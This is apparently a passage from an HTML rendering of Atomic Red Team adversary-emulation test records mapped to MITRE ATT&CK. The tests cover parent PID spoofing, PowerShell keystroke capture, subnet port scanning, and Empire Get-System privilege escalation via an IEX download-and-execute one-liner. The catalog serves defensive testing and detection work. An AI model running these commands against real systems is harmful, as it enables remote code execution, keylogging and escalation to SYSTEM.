<li><strong>prereq_command</strong>: $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}</li>
<li>
<p><strong>get_prereq_command</strong>: Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force</p>
</li>
<li>
<p><strong>cleanup_command</strong>: </p>
</li>
<li><strong>mitre_id</strong>: T1134.004</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: {'description': 'File path or name of process to spawn', 'type': 'path', 'default': '$Env:windir\System32\WindowsPowerShell\v1.0\powershell.exe'}</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 2988133e-561c-4e42-a15f-6281e6a9b2db</li>
<li><strong>name</strong>: Parent PID Spoofing - Spawn from New Process</li>
<li><strong>description</strong>: Creates a notepad.exe process and then spawns a powershell.exe process as a child of it.</li>
<li><strong>platforms</strong>: ['windows']</li>
<li><strong>command</strong>: Start-Process -FilePath #{parent_name} -PassThru | Start-ATHProcessUnderSpecificParent -FilePath #{file_path} -CommandLine '#{command_line}'</li>
<li><strong>prereq_command</strong>: $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}</li>
<li>
<p><strong>get_prereq_command</strong>: Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force</p>
</li>
<li>
<p><strong>cleanup_command</strong>: </p>
</li>
<li><strong>mitre_id</strong>: T1134.004</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: {'description': 'File path or name of process to spawn', 'type': 'path', 'default': '$Env:windir\System32\WindowsPowerShell\v1.0\powershell.exe'}</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: d9b633ca-8efb-45e6-b838-70f595c6ae26</li>
<li><strong>name</strong>: Input Capture</li>
<li><strong>description</strong>: Utilize PowerShell and external resource to capture keystrokes
<a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.001/src/Get-Keystrokes.ps1">Payload</a>
Provided by <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1">PowerSploit</a></li>
</ul>
<p>Upon successful execution, Powershell will execute <code>Get-Keystrokes.ps1</code> and output to key.log.</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: &amp;"$PathToAtomicsFolder\T1056.001\src\Get-Keystrokes.ps1" -LogPath #{filepath}</p>
</li>
<li>
<p><strong>prereq_command</strong>: if (Test-Path "PathToAtomicsFolder\T1056.001\src\Get-Keystrokes.ps1") {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: New-Item -ItemType Directory (Split-Path "PathToAtomicsFolder\T1056.001\src\Get-Keystrokes.ps1") -Force | Out-Null
Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1056.001/src/Get-Keystrokes.ps1 -OutFile "PathToAtomicsFolder\T1056.001\src\Get-Keystrokes.ps1"</p>
</li>
<li>
<p><strong>cleanup_command</strong>: Remove-Item $env:TEMP\key.log -ErrorAction Ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1056.001</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 05df2a79-dba6-4088-a804-9ca0802ca8e4</li>
<li><strong>name</strong>: Port-Scanning /24 Subnet with PowerShell</li>
<li>
<p><strong>description</strong>: Scanning common ports in a /24 subnet. If no IP address for the target subnet is specified the test tries to determine the attacking machine's "primary" IPv4 address first and then scans that address with a /24 netmask.
The connection attempts to use a timeout parameter in milliseconds to speed up the scan. Please note the atomic might not print any output until the scans are completed.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li><strong>command</strong>: $ipAddr = "#{ip_address}"
if ($ipAddr -eq "") {
    # Assumes the "primary" interface is shown at the top
    $interface = Get-NetIPInterface -AddressFamily IPv4 -ConnectionState Connected | Select-Object -ExpandProperty InterfaceAlias -First 1
    Write-Host "[i] Using Interface $interface"
    $ipAddr = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $interface | Select-Object -ExpandProperty IPAddress
}
Write-Host "[i] Base IP-Address for Subnet: $ipAddr"
$subnetSubstring = $ipAddr.Substring(0, $ipAddr.LastIndexOf('.') + 1)</li>
</ul>
<h1>Always assumes /24 subnet</h1>
<p>Write-Host "[i] Assuming /24 subnet. scanning $subnetSubstring'1' to $subnetSubstring'254'"</p>
<p>$ports = #{port_list}
$subnetIPs = 1..254 | ForEach-Object { "$subnetSubstring$_" }</p>
<p>foreach ($ip in $subnetIPs) {
    foreach ($port in $ports) {
      try {
          $tcp = New-Object Net.Sockets.TcpClient
          $tcp.ConnectAsync($ip, $port).Wait(#{timeout_ms}) | Out-Null
      } catch {}
      if ($tcp.Connected) {
          $tcp.Close()
          Write-Host "Port $port is open on $ip"
      }
    }
}</p>
<ul>
<li><strong>prereq_command</strong>: </li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1046</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 9e55750e-4cbf-4013-9627-e9a045b541bf</li>
<li><strong>name</strong>: Remote Desktop Services Discovery via PowerShell</li>
<li>
<p><strong>description</strong>: Availability of remote desktop services can be checked using get- cmdlet of PowerShell</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Get-Service -Name "Remote Desktop Services", "Remote Desktop Configuration"</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1046</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 90db9e27-8e7c-4c04-b602-a45927884966</li>
<li><strong>name</strong>: Named pipe client impersonation</li>
<li><strong>description</strong>: Uses PowerShell and Empire's <a href="https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1">GetSystem module</a>. The script creates a named pipe, and a service that writes to that named pipe. When the service connects to the named pipe, the script impersonates its security context.
When executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).</li>
</ul>
<p>Reference: https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/
- <strong>platforms</strong>: ['windows']
- <strong>command</strong>: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose</p>
<ul>
<li><strong>prereq_command</strong>: </li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1134.001</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 34f0a430-9d04-4d98-bcb5-1989f14719f0</li>
<li><strong>name</strong>: <code>SeDebugPrivilege</code> token duplication</li>
<li><strong>description</strong>: Uses PowerShell and Empire's <a href="https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1">GetSystem module</a>. The script uses <code>SeDebugPrivilege</code> to obtain, duplicate and impersonate the token of a another process.
When executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).</li>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1134.001</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
